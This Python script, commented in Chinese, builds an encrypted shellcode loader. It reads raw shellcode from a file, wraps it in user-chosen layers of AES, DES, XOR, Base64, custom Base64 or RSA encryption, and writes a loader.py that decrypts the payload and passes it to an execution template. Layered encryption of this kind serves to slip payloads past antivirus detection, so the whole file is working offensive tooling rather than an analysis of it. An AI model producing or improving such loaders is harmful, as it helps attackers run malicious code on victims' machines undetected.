from encrypt_plugins.aes_plugin import AESPlugin
from encrypt_plugins.xor_plugin import XORPlugin
from encrypt_plugins.base64_plugin import Base64Plugin
from encrypt_plugins.custom_base64_plugin import CustomBase64Plugin
from encrypt_plugins.des_plugin import DESPlugin
from encrypt_plugins.rsa_plugin import RSAPlugin
import importlib.util
from templates.exec_template import exec_code

def generate_loader():
    # 读取 shellcode.py 中的 buf 变量
    spec = importlib.util.spec_from_file_location("shellcode_module", "shellcode.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    shellcode = bytearray(module.buf.encode("latin1"))

    # 用户选择插件顺序
    plugins = []
    # encrypt_loader.py
    used_plugins = []  # 新增，用于记录插件类名
    print("请选择对 loader.py 进行加密的方式（多层），输入 done 结束：")
    while True:
        opt = input("1=AES, 2=DES, 3=XOR, 4=Base64, 5=CustomBase64, 6=RSA, done=完成: ")
        if opt == "1":
            key = input("请输入 AES 密钥: ")
            plugins.append(AESPlugin(key))
            used_plugins.append("AESPlugin")  # <== 记录
        elif opt == "2":
            key = input("请输入 DES 密钥: ")
            plugins.append(DESPlugin(key))
            used_plugins.append("DESPlugin")
        elif opt == "3":
            key = input("请输入 XOR 密钥: ")
            plugins.append(XORPlugin(key))
            used_plugins.append("XORPlugin")
        elif opt == "4":
            plugins.append(Base64Plugin(key=""))
            used_plugins.append("Base64Plugin")
        elif opt == "5":
            plugins.append(CustomBase64Plugin())
            used_plugins.append("CustomBase64Plugin")
        elif opt == "6":
            plugins.append(RSAPlugin())
            used_plugins.append("RSAPlugin")
        elif opt == "done":
            break
        else:
            print("无效输入，请重新选择")

    # 多层加密
    data = shellcode
    for plugin in plugins:
        data = plugin.encrypt(data)

    # loader 代码生成
    var_chain = ["ciphertext"] + [f"layer_{i}" for i in range(len(plugins) - 1)] + ["shellcode"]
    decrypt_code = ""
    for i, plugin in enumerate(reversed(plugins)):
        decrypt_code += plugin.decrypt_code(var_chain[i], var_chain[i + 1]) + "\n"

    # 如果没有加密插件，显式声明 shellcode
    if not plugins:
        decrypt_code += "shellcode = bytes(ciphertext)\n"

    # 写入 loader.py
    with open("loader.py", "w", encoding="utf-8") as f:
        f.write(f"ciphertext = {repr(data)}\n")
        f.write(decrypt_code)
        f.write(exec_code)

    print("[+] loader.py 已生成")
    # 最后记录下来
    with open("used_plugins.txt", "a", encoding="utf-8") as f:
        f.write("\n".join(used_plugins) + "\n")



if __name__ == '__main__':
    generate_loader()

    # key = "nXR70W6s"
    # key = "myry_ecest_ke"